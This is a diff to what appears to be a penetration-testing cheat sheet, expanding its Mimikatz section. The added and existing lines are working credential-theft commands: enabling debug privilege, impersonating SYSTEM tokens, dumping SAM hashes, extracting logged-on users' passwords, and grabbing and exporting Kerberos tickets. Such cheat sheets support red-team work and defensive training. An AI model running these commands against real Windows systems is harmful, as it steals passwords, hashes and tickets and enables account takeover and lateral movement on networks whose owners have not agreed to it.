@@ -1628,7 +1628,8 @@ medusa -d
 
 ## MIMIKATZ
 ```powershell
-# enable SeDebugPrivilege (tamper with other processes)
+# setup : start logging + enable SeDebugPrivilege (tamper with other processes)
+log
 privilege::debug
 
 # priv esc from Administrator to SYSTEM via token impersonation (if mimikatz launched as Administrator)
@@ -1639,6 +1640,15 @@ token::list
 
 # dump hashes from SAM
 lsadump::sam
+
+# dump credentials of logged-on users
+sekurlsa::logonpasswords
+
+# grab current user's tickets
+sekurlsa::tickets
+
+# get service ticket and write to disk (.kirbi)
+kerberos::list /export
 ```
 
 
